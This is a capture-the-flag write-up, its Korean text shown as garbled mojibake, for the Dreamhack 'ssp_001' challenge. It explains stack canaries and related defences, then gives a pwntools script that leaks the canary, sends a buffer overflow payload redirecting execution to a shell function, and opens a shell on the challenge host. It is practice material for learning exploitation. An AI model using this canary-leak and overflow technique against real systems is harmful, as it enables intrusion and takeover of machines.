<aside>
ğŸ’¡ SSPë€?

</aside>

SSP (Stack Smashing Protection)ëŠ” ì‹œìŠ¤í…œ í•´í‚¹, íŠ¹íˆ ìŠ¤íƒ ì˜¤ë²„í”Œë¡œìš° ê³µê²©ì— ëŒ€í•œ ë°©ì–´ ê¸°ë²•

1. **Canary ê°’**: ìŠ¤íƒì— í•¨ìˆ˜ì˜ ë¦¬í„´ ì£¼ì†Œ ì•ì— ì‘ì€ ë°ì´í„°(ìºë‚´ë¦¬)ë¥¼ ì‚½ì…í•©ë‹ˆë‹¤. ì´ ê°’ì€ í•¨ìˆ˜ê°€ ë¦¬í„´ë˜ê¸° ì „ì— ê²€ì‚¬ë˜ë©°, ë§Œì•½ ìºë‚´ë¦¬ ê°’ì´ ë³€ê²½ë˜ì—ˆë‹¤ë©´ ìŠ¤íƒ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí–ˆë‹¤ê³  ê°„ì£¼í•˜ê³  í”„ë¡œê·¸ë¨ì„ ì¢…ë£Œì‹œí‚µë‹ˆë‹¤.
2. **ì£¼ì†Œ ê³µê°„ ë ˆì´ì•„ì›ƒ ë¬´ì‘ìœ„í™” (ASLR)**: ë©”ëª¨ë¦¬ì— í”„ë¡œê·¸ë¨ì„ ë¡œë“œí•  ë•Œ ë§¤ë²ˆ ë‹¤ë¥¸ ë©”ëª¨ë¦¬ ì£¼ì†Œì— ë¡œë“œí•˜ëŠ” ê¸°ë²•ìœ¼ë¡œ, ê³µê²©ìê°€ ì˜ˆì¸¡ ê°€ëŠ¥í•œ ì£¼ì†Œë¥¼ ì•…ìš©í•˜ëŠ” ê²ƒì„ ì–´ë µê²Œ ë§Œë“­ë‹ˆë‹¤.
3. **Non-executable ìŠ¤íƒ**: ìŠ¤íƒ ë©”ëª¨ë¦¬ ì˜ì—­ì— ì‹¤í–‰ ê¶Œí•œì„ ë¶€ì—¬í•˜ì§€ ì•ŠìŒìœ¼ë¡œì¨, ìŠ¤íƒì— ì‚½ì…ëœ ì½”ë“œì˜ ì‹¤í–‰ì„ ë§‰ìŠµë‹ˆë‹¤.

SSPëŠ” ì£¼ë¡œ ì»´íŒŒì¼ëŸ¬ ìˆ˜ì¤€ì—ì„œ êµ¬í˜„ë˜ë©°, GCC ì»´íŒŒì¼ëŸ¬ì—ì„œëŠ” **`-fstack-protector`** ì˜µì…˜ì„ í†µí•´ í™œì„±í™”

//

ë¬¸ì œ íŒŒì¼ì— ë³´ë©´ get shell í•¨ìˆ˜ê°€ ìˆê³  ì•ì„œ í•´ì™”ë“¯ ë²„í¼ì˜¤ë²„í”Œë¡œìš° ì·¨ì•½ì ì´ ë³´ì¸ë‹¤. 

ë””ë²„ê¹…ì„ í†µí•´ canary ê°’ì„ ì•Œì•„ë‚´ê³  pwntoolë¡œ exploití•´ì£¼ë©´ ëœë‹¤.

```python
from pwn import *
from pwn import p32
from pwn import p8

p=remote("host3.dreamhack.games",10979)

canary=b"\x00"

for i in range(129,132): 
	p.recvuntil("> ")
	p.sendline("P")
	p.sendline(str(i))
	canary+=p8(int(p.recvline().split()[-1],16)) 

payload=b'\x90'*0x40+canary+b'\x90'*0x04+b'\x90'*0x04+p32(0x80486b9)

p.recvuntil("> ")
p.sendline("E")
p.sendlineafter("Name Size : ",str(144))
p.sendlineafter("Name : ",payload)

p.interactive()
```

![ssp_001.jpg](https://github.com/JoWoonJi/Dreamhack_Wargame/blob/main/SystemHacking/img/ssp_001.jpg)

DHê°’ íšë“.
